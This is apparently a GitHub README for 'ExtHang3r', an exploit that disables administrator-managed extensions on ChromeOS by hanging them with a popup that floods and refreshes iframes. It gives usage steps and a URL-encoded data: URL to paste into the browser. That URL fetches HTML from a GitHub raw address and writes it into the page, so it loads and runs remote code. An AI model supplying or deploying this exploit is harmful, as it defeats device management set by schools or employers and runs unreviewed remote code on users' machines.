# ExtHang3r

## What is it?
ExtHang3r is an exploit created by <a href="https://github.com/Blobby-Boi/">Blobby Boi</a> that allows ChromeOS users to kill managed extensions after the LTMEAT patch. It remains unpatched in all new ChromeOS versions as of January 2025.

## How does it work?
This exploit works very similar to <b>Dextensify</b>. The main difference being that instead of creating iframes and slowly getting rid of them, a separate popup window is created that spams iframes and refreshes them. After a few seconds, the popup is closed achieving similar behavior to the <b>LTMEAT Flood</b> method. This worked great in paper, but for whatever reason this hang just woudn't let you disable the extension with the file URLs switch. It would instead just restart the extension. However, a solution was quickly found and it was as simple as just attempting to load any of the extension's pages prior to flipping the switch.

## How do I use it?
To use the exploit, paste the following url into your url bar. More detailed instructions are provided in the exploit's page.

> [!TIP]
> If the tab immediately closes after opening, try changing the beginning of the URL from `data:` to `data://`.

```
data:text/html;charset=utf-8,%3C!DOCTYPE%20html%3E%0A%3Chtml%20lang%3D%22en%22%3E%0A%3Chead%3E%0A%20%20%3Cmeta%20charset%3D%22UTF-8%22%3E%0A%20%20%3Cmeta%20name%3D%22viewport%22%20content%3D%22width%3Ddevice-width%2C%20initial-scale%3D1.0%22%3E%0A%20%20%3Ctitle%3EExtHang3r%3C%2Ftitle%3E%0A%20%20%3Clink%20rel%3D%22shortcut%20icon%22%20type%3D%22image%2Fpng%22%20href%3D%22https%3A%2F%2Fraw.githubusercontent.com%2FBlobby-Boi%2FExtHang3r%2Frefs%2Fheads%2Fmain%2Ffavicon.png%22%3E%0A%20%20%3Cscript%3E%0A%20%20%20%20document.addEventListener(%22DOMContentLoaded%22%2C%20()%20%3D%3E%20%7B%0A%20%20%20%20%20%20const%20url%20%3D%20%22https%3A%2F%2Fraw.githubusercontent.com%2FBlobby-Boi%2FExtHang3r%2Frefs%2Fheads%2Fmain%2Findex.html%22%3B%0A%0A%20%20%20%20%20%20fetch(url)%0A%20%20%20%20%20%20%20%20.then(response%20%3D%3E%20response.text())%0A%20%20%20%20%20%20%20%20.then(html%20%3D%3E%20%7B%0A%20%20%20%20%20%20%20%20%20%20document.open()%3B%0A%20%20%20%20%20%20%20%20%20%20document.write(html)%3B%0A%20%20%20%20%20%20%20%20%20%20document.close()%3B%0A%20%20%20%20%20%20%20%20%7D)%3B%0A%20%20%20%20%7D)%3B%0A%20%20%3C%2Fscript%3E%0A%3C%2Fhead%3E%0A%3C%2Fhtml%3E
```
